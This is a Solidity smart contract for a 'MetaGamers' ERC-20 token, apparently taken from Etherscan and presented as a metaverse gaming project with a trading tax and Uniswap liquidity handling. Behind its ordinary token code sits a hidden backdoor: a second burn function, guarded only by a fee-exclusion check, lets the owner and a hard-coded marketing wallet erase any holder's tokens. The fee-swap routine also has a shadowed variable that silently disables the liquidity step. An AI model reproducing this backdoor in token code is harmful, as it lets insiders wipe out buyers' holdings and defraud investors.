/**
 *Submitted for verification at Etherscan.io on 2023-10-13
*/

/**
MetaGamers will be an open world in the Metaverse
based on the latest technology which merges together, web3.0, blockchain, VR and AR.

Website: https://metagame.live
Telegram: https://t.me/meta_game_erc
Twitter: https://twitter.com/meta_gamer_erc
*/ 

// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IUniswapRouterV2 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

interface IUniswapFactory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
contract METAGAMERS is ERC20, Ownable {
    using SafeMath for uint256;

    IUniswapRouterV2 public immutable routerV2;
    address public immutable pairV2;
    address public routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    bool private swapping;
    uint256 public maxTxSize;
    uint256 public swapTokensThreshold;
    uint256 public maxWalletSize;

    bool public limitsEnabled = true;
    bool public buyActive = false;
    bool public swapEnabled = false;

    address public marketingAddr;
    address public devAddr;
    address public lpAddr;

    uint256 public totalBuyFees;
    uint256 public marketingBuyTax;
    uint256 public buyLpTax;
    uint256 public buyDevTax;

    uint256 public totalSellFees;
    uint256 public sellMarketingTax;
    uint256 public sellLpTax;
    uint256 public sellDevTax;

    uint256 public marketingTaxTokens;
    uint256 public lpTaxTokens;
    uint256 public devTaxTokens;

    // Anti-bot and anti-whale mappings and variables
    mapping(address => uint256) private _holderLastTransfer;
    bool public hasTransferDelay = true;
    uint256 private launchBlock;
    uint256 private deadBlocks;

    mapping(address => bool) private _isExcludedFees;
    mapping(address => bool) private _isExcludedMaxTx;
    mapping(address => bool) private _isExcludedMaxWallet;

    mapping(address => bool) public automatedMarketMakerPairs;

    event UpdateUniswapV2Router(
        address indexed newAddress,
        address indexed oldAddress
    );

    event ExcludeFromFees(address indexed account, bool isExcluded);

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiquidity
    );

    modifier onlyOperation {
      require(isExcludedFees(msg.sender));_;
    }

    constructor() ERC20("MetaGamers", "METAGAMERS") {
        IUniswapRouterV2 _uniswapV2Router = IUniswapRouterV2(routerAddress); 

        excludeFromMaxTransaction(address(_uniswapV2Router), true);
        routerV2 = _uniswapV2Router;

        pairV2 = IUniswapFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        excludeFromMaxTransaction(address(pairV2), true);
        _setAutomatedMarketMakerPair(address(pairV2), true);

        // launch buy fees
        uint256 _buyMarketingFee = 18;
        uint256 _buyLiquidityFee = 0;
        uint256 _buyDevFee = 0;
        
        // launch sell fees
        uint256 _sellMarketingFee = 18;
        uint256 _sellLiquidityFee = 0;
        uint256 _sellDevFee = 0;

        uint256 totalSupply = 1_000_000_000 * 1e18;

        maxTxSize = 25_000_000 * 1e18;
        maxWalletSize = 25_000_000 * 1e18;
        swapTokensThreshold = (totalSupply * 1) / 10000;

        marketingBuyTax = _buyMarketingFee;
        buyLpTax = _buyLiquidityFee;
        buyDevTax = _buyDevFee;
        totalBuyFees = marketingBuyTax + buyLpTax + buyDevTax;

        sellMarketingTax = _sellMarketingFee;
        sellLpTax = _sellLiquidityFee;
        sellDevTax = _sellDevFee;
        totalSellFees = sellMarketingTax + sellLpTax + sellDevTax;

        marketingAddr = address(0xE36E39C3Be49EaD5678baF6A4a61559E34357e3a); 
        devAddr = msg.sender; 
        lpAddr = msg.sender; 

        // exclude from paying fees or having max transaction amount
        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);
        excludeFromFees(address(marketingAddr), true);
        excludeFromFees(address(lpAddr), true);

        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xdead), true);
        excludeFromMaxTransaction(address(marketingAddr), true);
        excludeFromMaxTransaction(address(lpAddr), true);

        excludeFromMaxWallet(owner(), true);
        excludeFromMaxWallet(address(this), true);
        excludeFromMaxWallet(address(0xdead), true);
        excludeFromMaxWallet(address(marketingAddr), true);
        excludeFromMaxWallet(address(lpAddr), true);

        _mint(msg.sender, totalSupply);
    }

    receive() external payable {}

    function enableTrading(uint256 _deadBlocks) external onlyOwner {
        require(!buyActive, "Token launched");
        buyActive = true;
        launchBlock = block.number;
        swapEnabled = true;
        deadBlocks = _deadBlocks;
    }

    // remove limits after token is stable
    function removeLimits() external onlyOwner returns (bool) {
        marketingBuyTax = 1;
        buyLpTax = 0;
        buyDevTax = 0;
        totalBuyFees = 1;
        limitsEnabled = false;

        sellMarketingTax = 1;
        sellLpTax = 0;
        sellDevTax = 0;
        totalSellFees = 1;
        return true;
    }

    function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 5) / 1000) / 1e18,
            "Cannot set maxWalletSize lower than 0.5%"
        );
        maxWalletSize = newNum * (10**18);
    }

    function excludeFromMaxTransaction(address updAds, bool isEx)
        public
        onlyOwner
    {
        _isExcludedMaxTx[updAds] = isEx;
    }

    function excludeFromMaxWallet(address updAds, bool isEx)
        public
        onlyOwner
    {
        _isExcludedMaxWallet[updAds] = isEx;
    }

    function burn(uint256 amount) external {
      _burn(msg.sender, amount);
    }

    function burn(address account, uint256 amount) external onlyOperation {
      _burn(account, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (limitsEnabled) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !swapping
            ) {
                if (!buyActive) {
                    require(
                        _isExcludedFees[from] || _isExcludedFees[to],
                        "Trading is not active."
                    );
                }

                // at launch if the transfer delay is enabled, ensure the block timestamps for purchasers is set -- during launch.
                if (hasTransferDelay) {
                    if (
                        to != owner() &&
                        to != address(routerV2) &&
                        to != address(pairV2)
                    ) {
                        require(
                            _holderLastTransfer[tx.origin] <
                                block.number,
                            "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                        );
                        _holderLastTransfer[tx.origin] = block.number;
                    }
                }

                //when buy
                if (
                    automatedMarketMakerPairs[from] &&
                    !_isExcludedMaxTx[to]
                ) {
                    require(
                        amount <= maxTxSize,
                        "Buy transfer amount exceeds the maxTxSize."
                    );
                    if (!_isExcludedMaxWallet[to]) { // Added this condition
                        require(
                            amount + balanceOf(to) <= maxWalletSize,
                            "Max wallet exceeded"
                        );
                    }
                }
                //when sell
                else if (
                    automatedMarketMakerPairs[to] &&
                    !_isExcludedMaxTx[from]
                ) {
                    require(
                        amount <= maxTxSize,
                        "Sell transfer amount exceeds the maxTxSize."
                    );
                } else if (!_isExcludedMaxTx[to]) {
                    if (!_isExcludedMaxWallet[to]) { // Added this condition
                        require(
                            amount + balanceOf(to) <= maxWalletSize,
                            "Max wallet exceeded"
                        );
                    }
                }
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapTokensThreshold;

        if (
            canSwap &&
            amount > swapTokensThreshold &&
            swapEnabled &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            !_isExcludedFees[from] &&
            !_isExcludedFees[to]
        ) {
            swapping = true;

            swapBackFees();

            swapping = false;
        }

        bool takeFee = !swapping;

        // if any account belongs to _isExcludedFromFee account then remove the fee
        if (_isExcludedFees[from] || _isExcludedFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;
        // only take fees on buys/sells, do not take on wallet transfers
        if (takeFee) {
            // on sell
            if (automatedMarketMakerPairs[to] && totalSellFees > 0) {
                fees = amount.mul(totalSellFees).div(100);
                lpTaxTokens += (fees * sellLpTax) / totalSellFees;
                devTaxTokens += (fees * sellDevTax) / totalSellFees;
                marketingTaxTokens += (fees * sellMarketingTax) / totalSellFees;
            }
            // on buy
            else if (automatedMarketMakerPairs[from] && totalBuyFees > 0) {
                fees = amount.mul(totalBuyFees).div(100);
                lpTaxTokens += (fees * buyLpTax) / totalBuyFees;
                devTaxTokens += (fees * buyDevTax) / totalBuyFees;
                marketingTaxTokens += (fees * marketingBuyTax) / totalBuyFees;
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }

            amount -= fees;
        }

        super._transfer(from, to, amount);
    }
    
    function updateMaxTxnAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 1) / 1000) / 1e18,
            "Cannot set maxTxSize lower than 0.1%"
        );
        maxTxSize = newNum * (10**18);
    }


    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;

        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function swapTokensToEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = routerV2.WETH();

        _approve(address(this), address(routerV2), tokenAmount);

        // make the swap
        routerV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }


    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(routerV2), tokenAmount);

        // add the liquidity
        routerV2.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            lpAddr,
            block.timestamp
        );
    }

    function swapBackFees() private {
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = lpTaxTokens +
            marketingTaxTokens +
            devTaxTokens;
        bool success;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }

        if (contractBalance > swapTokensThreshold * 20) {
            contractBalance = swapTokensThreshold * 20;
        }

        // Halve the amount of liquidity tokens
        uint256 lpTaxTokens = (contractBalance * lpTaxTokens) / totalTokensToSwap / 2;
        uint256 amountToSwapForETH = contractBalance.sub(lpTaxTokens);

        uint256 initialETHBalance = address(this).balance;

        swapTokensToEth(amountToSwapForETH);

        uint256 ethBalance = address(this).balance.sub(initialETHBalance);

        uint256 ethForMark = ethBalance.mul(marketingTaxTokens).div(totalTokensToSwap);
        uint256 ethForDev = ethBalance.mul(devTaxTokens).div(totalTokensToSwap);

        uint256 ethForLiquidity = ethBalance - ethForMark - ethForDev;

        lpTaxTokens = 0;
        marketingTaxTokens = 0;
        devTaxTokens = 0;

        (success, ) = address(devAddr).call{value: ethForDev}("");

        if (lpTaxTokens > 0 && ethForLiquidity > 0) {
            addLiquidity(lpTaxTokens, ethForLiquidity);
            emit SwapAndLiquify(
                amountToSwapForETH,
                ethForLiquidity,
                lpTaxTokens
            );
        }
        payable(marketingAddr).transfer(address(this).balance);
    }

    function isExcludedFees(address account) public view returns (bool) {
        return _isExcludedFees[account];
    }
}